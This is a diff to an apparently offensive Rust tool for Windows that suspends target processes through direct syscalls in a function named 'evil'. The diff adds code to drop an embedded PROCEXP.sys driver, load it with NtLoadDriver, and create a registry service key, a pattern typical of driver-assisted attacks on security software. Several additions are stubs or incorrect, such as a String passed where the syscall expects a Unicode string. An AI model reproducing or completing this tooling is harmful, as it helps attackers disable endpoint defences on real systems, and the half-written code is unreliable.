@@ -2,12 +2,54 @@ use colored::Colorize;
 use ntapi::ntapi_base::CLIENT_ID;
 use rust_syscalls::syscall;
 use std::env;
+use std::fs;
 use std::mem::size_of;
+use std::process::exit;
 use sysinfo::PidExt;
 use sysinfo::ProcessExt;
 use sysinfo::SystemExt;
 use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
 use winapi::um::winnt::PROCESS_SUSPEND_RESUME;
+use winapi::shared::ntdef::PUNICODE_STRING;
+use std::include_bytes;
+
+use std::io;
+use std::path::Path;
+use winreg::enums::*;
+use winreg::RegKey;
+
+fn load_driver(servicename: String) -> bool {
+    //servicename = servicename as PUNICODE_STRING;
+    unsafe {
+        let ntstatus = syscall!(
+            "NtLoadDriver",
+            servicename
+        );
+    }
+    true
+}
+
+fn create_registry_key(drivername: String, servicename: String) -> Result<(), Box<dyn std::error::Error>> {
+    //let reg_path = format!("\\SYSTEM\\CurrentControlSet\\Services{}", servicename);
+    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
+    let path = Path::new("SYSTEM").join("CurrentControlSet").join("Services");
+    let (key, disp) = hkcu.create_subkey(&path)?;
+
+    key.set_value("TestSZ", &"written by Rust")?;
+    let sz_val: String = key.get_value("TestSZ")?;
+    key.delete_value("TestSZ")?;
+    println!("TestSZ = {}", sz_val);
+
+    Ok(())
+}
+
+fn write_driver() -> Result<(), Box<dyn std::error::Error>> {
+    let driver = include_bytes!("../resources/PROCEXP.sys");
+    fs::write("PROCEXP.sys", driver)?;
+    Ok(())
+}
+
+
 
 fn evil(target: &str) {
     let system = sysinfo::System::new_all();
@@ -124,6 +166,13 @@ fn main() {
     let args: Vec<String> = env::args().collect();
 
     println!("Run this tool as SYSTEM for maximum effect");
+
+    //let res = write_driver();
+    //dbg!("{}",res);
+
+    let res = create_registry_key("Drivername".to_string(), "Servicename".to_string());
+    dbg!("{}",res);
+    exit(0);
 
     if args.len() == 2 {
         println!(
